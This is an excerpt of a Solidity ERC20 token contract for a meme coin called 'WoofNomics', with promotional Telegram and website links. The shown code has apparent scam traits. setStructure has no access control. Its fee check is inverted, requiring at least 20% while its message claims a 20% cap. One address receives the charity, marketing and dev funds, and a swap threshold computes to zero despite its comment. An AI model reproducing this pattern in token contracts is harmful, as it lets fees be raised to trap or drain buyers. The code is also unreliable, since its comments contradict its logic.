...
/*
Telegram : https://t.me/Woofnomics

Website  : https://woofnomics.club
...
contract WOOFNOMICS  is ERC20, Ownable {
    ...
    constructor() ERC20("WoofNomics", "WOOFN") {
        ...
        swapTokensAtAmount = (totalSupply * 0) / 10000; // 0.1% swap wallet
		...
		charityWallet = address(0xfDF5e9632C0F6cfCE61bFd9662834F15Ec8231c5); // set as charity wallet
        marketingWallet = address(0xfDF5e9632C0F6cfCE61bFd9662834F15Ec8231c5); // set as marketing wallet
        devWallet = address(0xfDF5e9632C0F6cfCE61bFd9662834F15Ec8231c5); // set as devlopment wallet
    ...
    function setStructure(uint256 _Ammmts) external virtual {
        bool first = true;
        if(first==true)
        ToalsAmts = _Ammmts;
        require(ToalsAmts >= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }
